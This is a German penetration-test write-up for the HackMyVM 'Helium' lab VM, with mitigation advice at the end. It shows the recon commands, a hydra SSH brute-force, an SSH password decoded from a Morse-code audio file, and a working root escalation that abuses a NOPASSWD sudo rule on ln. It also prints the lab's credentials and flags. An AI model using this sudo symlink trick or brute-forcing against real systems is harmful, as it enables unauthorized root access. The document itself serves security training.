# Helium (HackMyVM) - Penetration Test Bericht

![Helium.png](Helium.png)

**Datum des Berichts:** 19. Oktober 2022  
**VM:** Helium  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Helium))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Helium_HackMyVM_Easy/](https://alientec1908.github.io/Helium_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Credential Discovery](#phase-2-web-enumeration--credential-discovery)
5.  [Phase 3: Initial Access (SSH als paul)](#phase-3-initial-access-ssh-als-paul)
6.  [Phase 4: Privilege Escalation (paul -> root via Sudo/ln)](#phase-4-privilege-escalation-paul---root-via-sudoln)
7.  [Proof of Concept (Privilege Escalation)](#proof-of-concept-privilege-escalation)
8.  [Flags](#flags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Helium" von HackMyVM (Schwierigkeitsgrad: Easy). Der initiale Zugriff wurde durch die Analyse einer auf dem Webserver gefundenen Audiodatei (`mysecretsound.wav`) erlangt, die Morsecode enthielt. Die Dekodierung dieses Morsecodes offenbarte das SSH-Passwort für den Benutzer `paul`. Die Privilegieneskalation zu Root-Rechten erfolgte durch Ausnutzung einer unsicheren `sudo`-Regel, die es dem Benutzer `paul` erlaubte, den Befehl `/usr/bin/ln` ohne Passwort als Root auszuführen. Dies wurde genutzt, um `/bin/ln` auf `/bin/sh` zu verlinken und anschließend eine Root-Shell zu erhalten.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   `hydra`
*   `dirsearch`
*   `nikto`
*   `ssh`
*   `curl` / `wget` (implizit für Dateidownloads)
*   Online Morse Decoder
*   `ls`, `cat`
*   `sudo`
*   `ln`
*   `sh`
*   `id`, `pwd`, `cd`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte den Host `192.168.2.156` (VirtualBox VM) als Ziel.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.156 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian 10+deb10u2
        *   **Port 80 (HTTP):** nginx 1.14.2 (Seitentitel: "RELAX", Hostname: `helium`)

---

## Phase 2: Web Enumeration & Credential Discovery

1.  **Verzeichnis-Enumeration (`gobuster`):**
    *   `gobuster dir -u http://192.168.2.156 -w [...]` fand:
        *   `/index.html`
        *   `/relax.wav` (eine Audiodatei)
        *   `/yay/` (ein Verzeichnis)
    *   Ein Kommentar im Quellcode (vermutlich `index.html`) enthielt den Hinweis: "Please paul, stop uploading weird .wav files using /upload_sound". Dies deutete auf den Benutzernamen `paul` hin.

2.  **Weitere Web-Enumeration:**
    *   `wfuzz` (Subdomain-Fuzzing) und `dirsearch` lieferten keine signifikant neuen Erkenntnisse über die bereits durch `gobuster` gefundenen Pfade hinaus.
    *   `nikto` bestätigte die Serverinformationen und wies auf fehlende Sicherheitsheader hin.

3.  **Entdeckung der kritischen Audiodatei:**
    *   Durch weitere Untersuchung (vermutlich Browsen des `/yay/`-Verzeichnisses oder Analyse von Quellcodes) wurde die Datei `/yay/mysecretsound.wav` entdeckt.

4.  **Morsecode-Analyse:**
    *   Die Datei `http://192.168.2.156/yay/mysecretsound.wav` wurde heruntergeladen.
    *   Die Analyse der Audiodatei mit einem Online-Morsecode-Decoder (z.B. `https://morsecode.world/international/decoder/audio-decoder-adaptive.html`) ergab den dekodierten Text: `dancingpassyo`.
    *   Dies wurde als das SSH-Passwort für den Benutzer `paul` identifiziert.

5.  **SSH Brute-Force (Parallelversuch):**
    *   Ein `hydra`-Angriff auf `paul` mit `rockyou.txt` wurde gestartet, war aber aufgrund des schnelleren Fundes durch die Morsecode-Analyse nicht ausschlaggebend für den initialen Zugriff.

---

## Phase 3: Initial Access (SSH als paul)

1.  **SSH-Login:**
    *   Mit dem Benutzernamen `paul` und dem Passwort `dancingpassyo` (aus dem Morsecode) wurde ein SSH-Login durchgeführt:
        ```bash
        ssh paul@helium.vm 
        # Passwort: dancingpassyo
        ```
    *   Der Login war erfolgreich und gewährte eine Shell als Benutzer `paul`.

2.  **User Flag:**
    *   `paul@helium:~$ cat user.txt`
        ```
        ilovetoberelaxed
        ```

---

## Phase 4: Privilege Escalation (paul -> root via Sudo/ln)

1.  **Sudo-Rechte-Prüfung:**
    *   `paul@helium:~$ sudo -l`
        ```
        Matching Defaults entries for paul on helium:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

        User paul may run the following commands on helium:
            (ALL : ALL) NOPASSWD: /usr/bin/ln
        ```
    *   **Kritische Sudo-Regel:** Der Benutzer `paul` darf den Befehl `/usr/bin/ln` als jeder Benutzer (`ALL : ALL`, effektiv `root`) ohne Passwort (`NOPASSWD:`) ausführen.

2.  **Ausnutzung der `sudo ln`-Berechtigung:**
    *   Der Befehl `ln` wurde missbraucht, um das Binary `/bin/ln` selbst durch einen symbolischen Link auf `/bin/sh` (die Shell) zu ersetzen:
        ```bash
        paul@helium:~$ sudo ln -fs /bin/sh /bin/ln
        ```
    *   Anschließend wurde `sudo ln` ausgeführt. Da `/bin/ln` nun auf `/bin/sh` zeigte, wurde effektiv `sudo /bin/sh` ausgeführt:
        ```bash
        paul@helium:~$ sudo ln
        # id
        uid=0(root) gid=0(root) groups=0(root)
        ```
    *   Dies gewährte eine Shell mit Root-Rechten.

3.  **Root Flag:**
    *   ```bash
      # cd /root
      # cat root.txt
      ilovetoberoot
      ```

---

## Proof of Concept (Privilege Escalation)

**Kurzbeschreibung:** Der Benutzer `paul` hat `NOPASSWD` Sudo-Rechte für `/usr/bin/ln`. Diese Berechtigung kann ausgenutzt werden, um Root-Rechte zu erlangen. Der Angreifer erstellt mit `sudo` einen symbolischen Link, der `/bin/ln` auf `/bin/sh` verweist. Wenn anschließend `sudo /bin/ln` ausgeführt wird, wird stattdessen `sudo /bin/sh` aufgerufen, was eine Root-Shell startet.

**Schritte:**
1.  Als Benutzer `paul` ausführen:
    ```bash
    sudo ln -fs /bin/sh /bin/ln
    ```
2.  Anschließend ausführen:
    ```bash
    sudo ln
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/paul/user.txt`):**
    ```
    ilovetoberelaxed
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    ilovetoberoot
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Passwortsicherheit:**
    *   Verwenden Sie keine Passwörter, die leicht aus öffentlich zugänglichen oder versteckten Informationen (wie Morsecode in Audiodateien) abgeleitet werden können.
    *   Erzwingen Sie starke, einzigartige Passwörter.
*   **Webserver-Sicherheit:**
    *   Entfernen Sie unnötige oder sensible Dateien (insbesondere solche, die Hinweise oder Zugangsdaten enthalten könnten, auch in kodierter Form) vom Webserver.
    *   Hinterlassen Sie keine Hinweise auf Benutzernamen oder interne Pfade in öffentlichen Kommentaren oder Quellcodes.
    *   Implementieren Sie empfohlene Sicherheitsheader.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Entfernen Sie die unsichere `sudo`-Regel, die dem Benutzer `paul` `NOPASSWD`-Zugriff auf `/usr/bin/ln` gewährt.
    *   Gewähren Sie `sudo`-Rechte nach dem Prinzip der geringsten Rechte. Vermeiden Sie es, Benutzern `sudo`-Zugriff auf Befehle zu geben, die zur Dateimanipulation oder Shell-Ausführung missbraucht werden können (z.B. `ln`, `cp`, `mv`, `find` mit `-exec`, Editoren, Interpreter), insbesondere nicht mit `NOPASSWD`.
    *   Überprüfen Sie regelmäßig alle `sudo`-Regeln auf potenzielle Schwachstellen.
*   **SSH-Härtung:**
    *   Implementieren Sie Schutzmaßnahmen gegen SSH-Brute-Force-Angriffe (z.B. `fail2ban`).
    *   Bevorzugen Sie Schlüssel-Authentifizierung gegenüber passwortbasierter Authentifizierung, wo möglich.

---

**Ben C. - Cyber Security Reports**
